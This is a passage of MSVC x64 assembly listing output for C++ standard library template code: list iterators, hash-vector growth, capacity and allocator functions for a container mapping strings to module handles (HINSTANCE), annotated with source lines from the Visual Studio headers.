this$ = 8
__param0$ = 16
__param1$dead$ = 24
??0?$_List_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@QEAA@PEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@1@PEBV?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@1@@Z PROC ; std::_List_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > >::_List_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > >, COMDAT

; 37   :     _List_unchecked_const_iterator(_Nodeptr _Pnode, const _Mylist* _Plist) noexcept : _Ptr(_Pnode) {

	mov	QWORD PTR [rcx], rdx
	mov	rax, rcx
	ret	0
??0?$_List_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@QEAA@PEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@1@PEBV?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@1@@Z ENDP ; std::_List_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > >::_List_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
;	COMDAT ??0?$_List_const_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@QEAA@PEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@1@PEBV?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@1@@Z
_TEXT	SEGMENT
this$ = 8
__param0$ = 16
__param1$dead$ = 24
??0?$_List_const_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@QEAA@PEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@1@PEBV?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@1@@Z PROC ; std::_List_const_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > >::_List_const_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > >, COMDAT

; 37   :     _List_unchecked_const_iterator(_Nodeptr _Pnode, const _Mylist* _Plist) noexcept : _Ptr(_Pnode) {

	mov	QWORD PTR [rcx], rdx
	mov	rax, rcx
	ret	0
??0?$_List_const_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@QEAA@PEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@1@PEBV?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@1@@Z ENDP ; std::_List_const_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > >::_List_const_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
;	COMDAT ??D?$_List_const_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@QEBAAEBU?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@1@XZ
_TEXT	SEGMENT
this$ = 8
??D?$_List_const_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@QEBAAEBU?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@1@XZ PROC ; std::_List_const_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > >::operator*, COMDAT

; 144  : #if _ITERATOR_DEBUG_LEVEL == 2
; 145  :         const auto _Mycont = static_cast<const _Mylist*>(this->_Getcont());
; 146  :         _STL_ASSERT(_Mycont, "cannot dereference value-initialized list iterator");
; 147  :         _STL_VERIFY(this->_Ptr != _Mycont->_Myhead, "cannot dereference end list iterator");
; 148  : #endif // _ITERATOR_DEBUG_LEVEL == 2
; 149  : 
; 150  :         return this->_Ptr->_Myval;

	mov	rax, QWORD PTR [rcx]
	add	rax, 16

; 151  :     }

	ret	0
??D?$_List_const_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@QEBAAEBU?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@1@XZ ENDP ; std::_List_const_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > >::operator*
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
;	COMDAT ??0?$_List_unchecked_const_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@U_Iterator_base0@2@@std@@QEAA@PEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@1@PEBV?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@1@@Z
_TEXT	SEGMENT
this$ = 8
_Pnode$ = 16
_Plist$dead$ = 24
??0?$_List_unchecked_const_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@U_Iterator_base0@2@@std@@QEAA@PEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@1@PEBV?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@1@@Z PROC ; std::_List_unchecked_const_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >,std::_Iterator_base0>::_List_unchecked_const_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >,std::_Iterator_base0>, COMDAT

; 37   :     _List_unchecked_const_iterator(_Nodeptr _Pnode, const _Mylist* _Plist) noexcept : _Ptr(_Pnode) {

	mov	QWORD PTR [rcx], rdx

; 38   :         this->_Adopt(_Plist);
; 39   :     }

	mov	rax, rcx
	ret	0
??0?$_List_unchecked_const_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@U_Iterator_base0@2@@std@@QEAA@PEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@1@PEBV?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@1@@Z ENDP ; std::_List_unchecked_const_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >,std::_Iterator_base0>::_List_unchecked_const_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >,std::_Iterator_base0>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ?_Get_first@?$_Compressed_pair@V?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@V?$_Vector_val@U?$_Simple_types@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@@2@$00@std@@QEAAAEAV?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@2@XZ
_TEXT	SEGMENT
this$ = 8
?_Get_first@?$_Compressed_pair@V?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@V?$_Vector_val@U?$_Simple_types@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@@2@$00@std@@QEAAAEAV?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@2@XZ PROC ; std::_Compressed_pair<std::allocator<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > >,std::_Vector_val<std::_Simple_types<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > > >,1>::_Get_first, COMDAT

; 1504 :         return *this;

	mov	rax, rcx

; 1505 :     }

	ret	0
?_Get_first@?$_Compressed_pair@V?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@V?$_Vector_val@U?$_Simple_types@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@@2@$00@std@@QEAAAEAV?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@2@XZ ENDP ; std::_Compressed_pair<std::allocator<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > >,std::_Vector_val<std::_Simple_types<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > > >,1>::_Get_first
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
;	COMDAT ?_Assign_grow@?$_Hash_vec@V?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@@std@@QEAAX_KV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@2@@Z
_TEXT	SEGMENT
this$ = 64
_Cells$ = 72
_Val$ = 80
?_Assign_grow@?$_Hash_vec@V?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@@std@@QEAAX_KV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@2@@Z PROC ; std::_Hash_vec<std::allocator<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > > >::_Assign_grow, COMDAT

; 284  :     void _Assign_grow(const size_type _Cells, const value_type _Val) {

$LN103:
	push	rbx
	push	rdi
	push	r14
	sub	rsp, 32					; 00000020H

; 270  :         return static_cast<size_type>(_Mypair._Myval2._Mylast - _Mypair._Myval2._Myfirst);

	mov	r9, QWORD PTR [rcx+8]

; 284  :     void _Assign_grow(const size_type _Cells, const value_type _Val) {

	mov	r14, rcx
	mov	rbx, r8

; 270  :         return static_cast<size_type>(_Mypair._Myval2._Mylast - _Mypair._Myval2._Myfirst);

	mov	r8, QWORD PTR [rcx]
	mov	rcx, r9
	sub	rcx, r8
	mov	rax, rcx
	sar	rax, 3

; 285  :         // set the elements stored here to _Cells copies of _Val, leaving the value unchanged if an exception is thrown
; 286  :         const auto _Oldsize = size();
; 287  :         _STL_INTERNAL_CHECK(_Oldsize <= _Cells);
; 288  :         auto& _Alvec = _Mypair._Get_first();
; 289  :         if (_Oldsize < _Cells) {

	cmp	rax, rdx
	jae	$LN2@Assign_gro
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 84   :         if (_Count > _Max_possible) {

	mov	rax, 2305843009213693951		; 1fffffffffffffffH
	mov	QWORD PTR [rsp+80], rsi
	cmp	rdx, rax
	ja	$LN86@Assign_gro

; 85   :             _Throw_bad_array_new_length(); // multiply overflow
; 86   :         }
; 87   :     }
; 88   : 
; 89   :     return _Count * _Ty_size;

	lea	rsi, QWORD PTR [rdx*8]

; 196  :     if (_Bytes == 0) {

	test	rsi, rsi
	jne	SHORT $LN16@Assign_gro

; 197  :         return nullptr;

	xor	edi, edi
	jmp	SHORT $LN15@Assign_gro
$LN16@Assign_gro:

; 198  :     }
; 199  : 
; 200  : #if _HAS_CXX20 // TRANSITION, GH-1532
; 201  :     if (_STD is_constant_evaluated()) {
; 202  :         return _Traits::_Allocate(_Bytes);
; 203  :     }
; 204  : #endif // _HAS_CXX20
; 205  : 
; 206  : #ifdef __cpp_aligned_new
; 207  :     if constexpr (_Align > __STDCPP_DEFAULT_NEW_ALIGNMENT__) {
; 208  :         size_t _Passed_align = _Align;
; 209  : #if defined(_M_IX86) || defined(_M_X64)
; 210  :         if (_Bytes >= _Big_allocation_threshold) {
; 211  :             // boost the alignment of big allocations to help autovectorization
; 212  :             _Passed_align = (_STD max)(_Align, _Big_allocation_alignment);
; 213  :         }
; 214  : #endif // defined(_M_IX86) || defined(_M_X64)
; 215  :         return _Traits::_Allocate_aligned(_Bytes, _Passed_align);
; 216  :     } else
; 217  : #endif // defined(__cpp_aligned_new)
; 218  :     {
; 219  : #if defined(_M_IX86) || defined(_M_X64)
; 220  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rsi, 4096				; 00001000H
	jb	SHORT $LN18@Assign_gro

; 153  :     const size_t _Block_size = _Non_user_size + _Bytes;

	lea	rcx, QWORD PTR [rsi+39]

; 154  :     if (_Block_size <= _Bytes) {

	cmp	rcx, rsi
	jbe	$LN86@Assign_gro

; 101  :         return ::operator new(_Bytes);

	call	??2@YAPEAX_K@Z				; operator new

; 159  :     _STL_VERIFY(_Ptr_container != 0, "invalid argument"); // validate even in release since we're doing p[-1]

	test	rax, rax
	je	$LN55@Assign_gro

; 160  :     void* const _Ptr = reinterpret_cast<void*>((_Ptr_container + _Non_user_size) & ~(_Big_allocation_alignment - 1));

	lea	rdi, QWORD PTR [rax+39]
	and	rdi, -32				; ffffffffffffffe0H

; 161  :     static_cast<uintptr_t*>(_Ptr)[-1] = _Ptr_container;

	mov	QWORD PTR [rdi-8], rax

; 222  :             return _Allocate_manually_vector_aligned<_Traits>(_Bytes);

	jmp	SHORT $LN15@Assign_gro
$LN18@Assign_gro:

; 101  :         return ::operator new(_Bytes);

	mov	rcx, rsi
	call	??2@YAPEAX_K@Z				; operator new
	mov	rdi, rax
$LN15@Assign_gro:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 281  :         return static_cast<size_type>(_Mypair._Myval2._Myend - _Mypair._Myval2._Myfirst);

	mov	rcx, QWORD PTR [r14]
	mov	rax, QWORD PTR [r14+16]
	sub	rax, rcx
	sar	rax, 3

; 290  :             const auto _Newvec = _Alvec.allocate(_Cells); // throws
; 291  :             // nothrow hereafter
; 292  :             const auto _Oldcapacity = capacity();
; 293  :             if (_Oldcapacity != 0) {

	test	rax, rax
	je	SHORT $LN44@Assign_gro
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	lea	rdx, QWORD PTR [rax*8]

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN58@Assign_gro

; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	r8, QWORD PTR [rcx-8]
	add	rdx, 39					; 00000027H

; 175  : 
; 176  :     // If the following asserts, it likely means that we are performing
; 177  :     // an aligned delete on memory coming from an unaligned allocation.
; 178  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 179  : 
; 180  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 181  :     // in range [_Min_back_shift, _Non_user_size]
; 182  : #ifdef _DEBUG
; 183  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 184  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 185  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 186  : #endif // ^^^ !defined(_DEBUG) ^^^
; 187  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

	sub	rcx, r8

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	lea	rax, QWORD PTR [rcx-8]
	cmp	rax, 31
	ja	SHORT $LN55@Assign_gro

; 189  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

	mov	rcx, r8
$LN58@Assign_gro:

; 258  :         ::operator delete(_Ptr, _Bytes);

	call	??3@YAXPEAX_K@Z				; operator delete
$LN44@Assign_gro:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 299  :             const auto _Newend       = _Newvec + _Cells;

	lea	rax, QWORD PTR [rsi+rdi]
	mov	QWORD PTR [r14], rdi

; 300  :             _Mypair._Myval2._Mylast  = _Newend;

	mov	QWORD PTR [r14+8], rax

; 301  :             _Mypair._Myval2._Myend   = _Newend;

	mov	QWORD PTR [r14+16], rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 1583 :     constexpr explicit _Uninitialized_backout(_NoThrowFwdIt _Dest) : _First(_Dest), _Last(_Dest) {}

	cmp	rdi, rax

; 1980 :         while (_Backout._Last != _ULast) {

	je	SHORT $LN99@Assign_gro
	npad	9
$LL62@Assign_gro:

; 1597 :         _STD _Construct_in_place(*_Last, _STD forward<_Types>(_Vals)...);

	mov	QWORD PTR [rdi], rbx

; 1598 :         ++_Last;

	add	rdi, 8

; 1980 :         while (_Backout._Last != _ULast) {

	cmp	rdi, rax
	jne	SHORT $LL62@Assign_gro
$LN99@Assign_gro:
	mov	rsi, QWORD PTR [rsp+80]
$LN73@Assign_gro:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 306  :     }

	add	rsp, 32					; 00000020H
	pop	r14
	pop	rdi
	pop	rbx
	ret	0
$LN2@Assign_gro:

; 304  :             _STD fill(_Mypair._Myval2._Myfirst, _Mypair._Myval2._Mylast, _Val);

	add	rcx, 7
	xor	edi, edi
	shr	rcx, 3
	cmp	r8, r9
	cmova	rcx, rdi
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility

; 5163 :         for (; _UFirst != _ULast; ++_UFirst) {

	test	rcx, rcx
	je	SHORT $LN73@Assign_gro
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 304  :             _STD fill(_Mypair._Myval2._Myfirst, _Mypair._Myval2._Mylast, _Val);

	mov	rdi, r8
	mov	rax, rbx
	rep stosq

; 306  :     }

	add	rsp, 32					; 00000020H
	pop	r14
	pop	rdi
	pop	rbx
	ret	0
$LN86@Assign_gro:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 155  :         _Throw_bad_array_new_length(); // add overflow

	call	?_Throw_bad_array_new_length@std@@YAXXZ	; std::_Throw_bad_array_new_length
	int	3
$LN55@Assign_gro:

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	call	_invalid_parameter_noinfo_noreturn
	int	3
$LN100@Assign_gro:
?_Assign_grow@?$_Hash_vec@V?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@@std@@QEAAX_KV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@2@@Z ENDP ; std::_Hash_vec<std::allocator<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > > >::_Assign_grow
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
;	COMDAT ?capacity@?$_Hash_vec@V?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@@std@@QEBA_KXZ
_TEXT	SEGMENT
this$ = 8
?capacity@?$_Hash_vec@V?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@@std@@QEBA_KXZ PROC ; std::_Hash_vec<std::allocator<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > > >::capacity, COMDAT

; 279  :         // This implementation never has capacity() differ from size(), but the previous implementation could.
; 280  :         // We need to handle that situation gracefully since we may link to old code (See GH-2774).
; 281  :         return static_cast<size_type>(_Mypair._Myval2._Myend - _Mypair._Myval2._Myfirst);

	mov	rax, QWORD PTR [rcx+16]
	sub	rax, QWORD PTR [rcx]
	sar	rax, 3

; 282  :     }

	ret	0
?capacity@?$_Hash_vec@V?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@@std@@QEBA_KXZ ENDP ; std::_Hash_vec<std::allocator<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > > >::capacity
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ?deallocate@?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@QEAAXQEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@2@_K@Z
_TEXT	SEGMENT
this$dead$ = 48
_Ptr$ = 56
_Count$ = 64
?deallocate@?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@QEAAXQEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@2@_K@Z PROC ; std::allocator<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > >::deallocate, COMDAT

; 947  :     _CONSTEXPR20 void deallocate(_Ty* const _Ptr, const size_t _Count) {

$LN23:
	sub	rsp, 40					; 00000028H
	mov	rax, rdx

